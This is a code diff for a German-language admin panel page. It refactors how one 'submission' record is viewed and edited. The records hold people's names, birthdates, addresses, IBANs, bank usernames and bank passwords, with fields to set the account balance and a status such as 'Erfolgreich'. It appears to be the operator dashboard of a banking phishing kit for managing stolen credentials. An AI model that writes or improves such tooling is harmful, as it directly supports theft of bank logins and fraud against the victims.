@@ -12,38 +12,8 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/u
 import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent as AlertContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle as AlertTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
 import { toast } from "sonner";
 import { ArrowLeft, Copy, Download, FileDown, Save, Trash2 } from "lucide-react";
-
-interface Submission {
-  id: string;
-  session_id: string;
-  created_at: string;
-  full_name: string | null;
-  email: string | null;
-  birthdate: string | null;
-  phone: string | null;
-  street: string | null;
-  house_number: string | null;
-  staircase: string | null;
-  door_number: string | null;
-  postal_code: string | null;
-  city: string | null;
-  iban: string | null;
-  bank: string | null;
-  bank_username: string | null;
-  bank_password: string | null;
-  bank_username_label: string | null;
-  bank_password_label: string | null;
-  bank_extra: Record<string, string> | null;
-  balance: string | null;
-  status: string | null;
-}
-
-interface Note {
-  id: string;
-  user_email: string;
-  content: string;
-  created_at: string;
-}
+import { useSubmission, type Note, type Submission } from "@/hooks/use-submissions";
+import { useQueryClient } from "@tanstack/react-query";
 
 const STATUS_OPTIONS = ["Neu", "In Bearbeitung", "Erfolgreich", "Down"] as const;
 
@@ -58,8 +28,8 @@ function DetailContent() {
   const { id } = useParams<{ id: string }>();
   const navigate = useNavigate();
   const user = useAdminUser();
-  const [loading, setLoading] = useState(true);
-  const [submission, setSubmission] = useState<Submission | null>(null);
+  const queryClient = useQueryClient();
+  const { submission, isLoading: loading } = useSubmission(id);
   const [notes, setNotes] = useState<Note[]>([]);
   const [newNote, setNewNote] = useState("");
   const [balance, setBalance] = useState("");
@@ -70,24 +40,18 @@ function DetailContent() {
   const [exportOpen, setExportOpen] = useState(false);
 
   useEffect(() => {
-    fetchData();
-  }, [id]);
-
-  const fetchData = async () => {
-    if (!id) return;
-    const [subRes, notesRes] = await Promise.all([
-      supabase.from("submissions").select("*").eq("id", id).single(),
-      supabase.from("submission_notes").select("*").eq("submission_id", id).order("created_at", { ascending: false }),
-    ]);
-    if (subRes.data) {
-      const sub = subRes.data as Submission;
-      setSubmission(sub);
-      setBalance(sub.balance || "");
-      setStatus(sub.status || "Neu");
+    if (submission) {
+      setBalance(submission.balance || "");
+      setStatus(submission.status || "Neu");
     }
-    if (notesRes.data) setNotes(notesRes.data as Note[]);
-    setLoading(false);
-  };
+  }, [submission]);
+
+  useEffect(() => {
+    if (id) {
+      supabase.from("submission_notes").select("*").eq("submission_id", id).order("created_at", { ascending: false })
+        .then(({ data }) => { if (data) setNotes(data as Note[]); });
+    }
+  }, [id]);
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -102,7 +66,8 @@ function DetailContent() {
     if (error) { toast.error("Fehler beim Speichern"); }
     else {
       toast.success("Guthaben gespeichert");
-      if (submission) setSubmission({ ...submission, balance: balance || null });
+      queryClient.invalidateQueries({ queryKey: ["submissions"] });
+      queryClient.invalidateQueries({ queryKey: ["submission", id] });
     }
   };
 
@@ -113,7 +78,8 @@ function DetailContent() {
     else {
       setStatus(newStatus);
       toast.success("Status gespeichert");
-      if (submission) setSubmission({ ...submission, status: newStatus });
+      queryClient.invalidateQueries({ queryKey: ["submissions"] });
+      queryClient.invalidateQueries({ queryKey: ["submission", id] });
     }
   };
 
@@ -132,6 +98,7 @@ function DetailContent() {
       toast.success("Notiz hinzugefügt");
       setNewNote("");
       if (data) setNotes((prev) => [data as Note, ...prev]);
+      queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
     }
   };
 
@@ -141,7 +108,11 @@ function DetailContent() {
     const { error } = await supabase.from("submissions").delete().eq("id", id);
     setDeleting(false);
     if (error) { toast.error("Fehler beim Löschen"); }
-    else { toast.success("Eintrag gelöscht"); navigate("/admin/logs"); }
+    else {
+      toast.success("Eintrag gelöscht");
+      queryClient.invalidateQueries({ queryKey: ["submissions"] });
+      navigate("/admin/logs");
+    }
   };
 
   const CopyValue = ({ label, value }: { label: string; value: string | null | undefined }) => (
@@ -207,7 +178,6 @@ function DetailContent() {
 
   return (
     <div className="max-w-5xl space-y-6">
-      {/* Header */}
       <div className="flex items-center gap-4">
         <Button variant="ghost" size="sm" onClick={() => navigate("/admin/logs")} className="gap-1.5 text-slate-500 hover:text-slate-800">
           <ArrowLeft className="h-4 w-4" /> Zurück
@@ -244,7 +214,6 @@ function DetailContent() {
         </AlertDialog>
       </div>
 
-      {/* Export Dialog */}
       <Dialog open={exportOpen} onOpenChange={setExportOpen}>
         <DialogContent className="max-w-lg">
           <DialogHeader><DialogTitle>Export</DialogTitle></DialogHeader>
@@ -261,7 +230,6 @@ function DetailContent() {
       </Dialog>
 
       <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
-        {/* Persönliche Daten */}
         <Card className="rounded-xl border-slate-200 shadow-sm">
           <CardHeader className="pb-2">
             <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Persönliche Daten</CardTitle>
@@ -276,7 +244,6 @@ function DetailContent() {
           </CardContent>
         </Card>
 
-        {/* Bank-Login */}
         <Card className="rounded-xl border-slate-200 shadow-sm">
           <CardHeader className="pb-2">
             <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Bank-Login</CardTitle>
@@ -295,7 +262,6 @@ function DetailContent() {
           </CardContent>
         </Card>
 
-        {/* Status */}
         <Card className="rounded-xl border-slate-200 shadow-sm">
           <CardHeader className="pb-2">
             <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Status</CardTitle>
@@ -313,7 +279,6 @@ function DetailContent() {
           </CardContent>
         </Card>
 
-        {/* Balance */}
         <Card className="rounded-xl border-slate-200 shadow-sm">
           <CardHeader className="pb-2">
             <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Guthaben</CardTitle>
@@ -328,7 +293,6 @@ function DetailContent() {
           </CardContent>
         </Card>
 
-        {/* Notizen */}
         <Card className="rounded-xl border-slate-200 shadow-sm md:col-span-2">
           <CardHeader className="pb-2">
             <CardTitle className="text-sm font-semibold text-slate-500 uppercase tracking-wider">Notizen</CardTitle>
